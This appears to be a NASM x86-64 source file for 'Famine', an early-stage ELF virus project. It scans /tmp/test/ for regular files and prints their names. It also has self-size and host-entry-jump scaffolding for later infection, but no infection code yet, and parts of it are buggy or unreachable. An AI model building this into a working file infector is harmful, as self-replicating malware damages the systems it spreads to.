	[BITS 64]

	%define SYS_WRITE		1
	%define SYS_OPEN		2
	%define SYS_CLOSE		3
	%define SYS_EXIT		60
	%define SYS_CHDIR		79
	%define SYS_GETDENTS64	217
	global famine64_func:function
	global famine64_size:data

	section .text
	famine64_size dd famine64_end - famine64_func

famine64_func:
	push 	rdi
	push 	rsi
	push 	rdx
	push 	rax
	push 	rbx

	lea 	rdi, [rel dir_one]
	mov		esi, dir_one_len
	call 	find_files
	jmp		end
	lea 	rdi, [rel dir_two]
	mov		esi, dir_two_len
	call 	find_files
	jmp		end

;; void find_files(char *dir_path, int dir_path_len)
find_files:
	push 	rbp
	mov 	rbp, rsp
	sub		rsp, 1040

	mov		DWORD [rel rsp - 1040], esi
	;; int	sys_open(rdi, 0, 0) 			-> ret: [rbp - 12] directory fd.
	mov 	rax, SYS_OPEN
	xor 	rsi, rsi
	xor 	rdx, rdx
	syscall
	cmp 	rax, 0
	jl	 	ret_error
	mov		DWORD [rel rbp - 12], eax
	;; int	sys_getdents(fd, *dirp, count)	-> ret: [rbp - 8]
	mov 	edi, DWORD [rel rbp - 12]
	lea 	rsi, [rel rbp - 1036]
	mov 	rdx, 1024
	mov 	rax, SYS_GETDENTS64
	syscall
	cmp		rax, 0
	jle		ret_error
	mov		DWORD [rel rbp - 8], eax
	;; int offset							-> [rbp - 4]
	mov 	DWORD [rel rbp - 4], 0
loop_file:
	mov		eax, DWORD [rel rbp - 4]
	cmp		eax, DWORD [rel rbp - 8]
	jge		loop_end

	lea		rax, [rel rbp - 1036]
	mov		edx, DWORD [rel rbp - 4]
	add		rdx, 18							; ino_t + off_t + unsigned short (offset of d_type)
	cmp		BYTE [rel rax + rdx], 8 		; if (d_type != DT_REG) (regular file)
	jne		next_file

	sub		rdx, 18
	lea		rdi, [rel rax + rdx]
	mov		esi, DWORD [rel rsp - 1040]
	call	get_dat_elf
	xor		rax, rax
next_file:
	mov		eax, DWORD [rel rbp - 4]
	cdqe
	lea		rdx, [rel rax + 16]
	lea		rax, [rel rbp - 1036]
	add		rax, rdx
	movzx	eax, BYTE [rax]
	movzx	eax, al
	add		DWORD [rel rbp - 4], eax
	jmp		loop_file
loop_end:
	mov		edi, DWORD [rel rbp - 12]
	mov		rax, SYS_CLOSE
	syscall
	leave
	ret
;; void		get_elf(struct dirent *file, int dir_path_len)
get_dat_elf:
	push	rbp
	mov		rbp, rsp
	sub		rsp, 12

	mov		[rel rsp - 12], rdi
	mov		DWORD [rel rsp - 4], esi
	
	;; pas besoin
	lea		rax, [rel rsp - 12]
	lea 	rdi, [rel rax + 19]
	call 	strlen

	;;  write(1, [rbp-1048] + [rbp-4], rax)
	mov 	rdx, rax
	lea		rax, [rel rbp - 12]
	lea		rsi, [rel rax + 19]
	mov 	rdi, 1
	mov 	rax, SYS_WRITE
	syscall
	;; // pas besoin

	leave
	ret

	;; int strlen(char *)
strlen:
	mov 	rax, 0
	cmp 	rdi, byte 0
	je 		strlen_ret
	sub		rcx, rcx			; mise a 0 du compteur
	sub		al, al				; mise a 0 du char de comparaison
	not		rcx					; inverse le binaire (surement protect overflow)
	cld							; auto increment le ptr rcx et rdi a chaque appel
	repne	scasb				; repeat while [rdi] != al
	not		rcx					; restaure le compteur
	dec		rcx					; retire 1
	mov		rax, rcx			; ret value
strlen_ret:	
	ret

end:	
	pop 	rbx
	pop 	rax
	pop 	rdx
	pop 	rsi
	pop 	rdi

	mov 	rax, SYS_EXIT
	syscall
	push 	QWORD [rel jump_vaddr]
	ret

ret_ok:	
	mov 	rax, 1
	mov 	rdi, 1
	mov 	rsi, OK
	mov 	rdx, 3
	syscall
	ret

ret_error:
	mov 	rax, 1
	mov 	rdi, 1
	mov 	rsi, ERR
	mov 	rdx, 6
	syscall
	ret

famine64_data:
	OK db "OK", 10
	ERR db "ERROR", 10
	banner db "Famine version 1.0 (c)oded by gbourgeo-xxxxxxxx"
	dir_one db "/tmp/test/", 0
	dir_one_len equ $ - dir_one
	dir_two db "/tmp/test2/", 0
	dir_two_len equ $ - dir_two
	jump_vaddr dq 0x0

famine64_end:
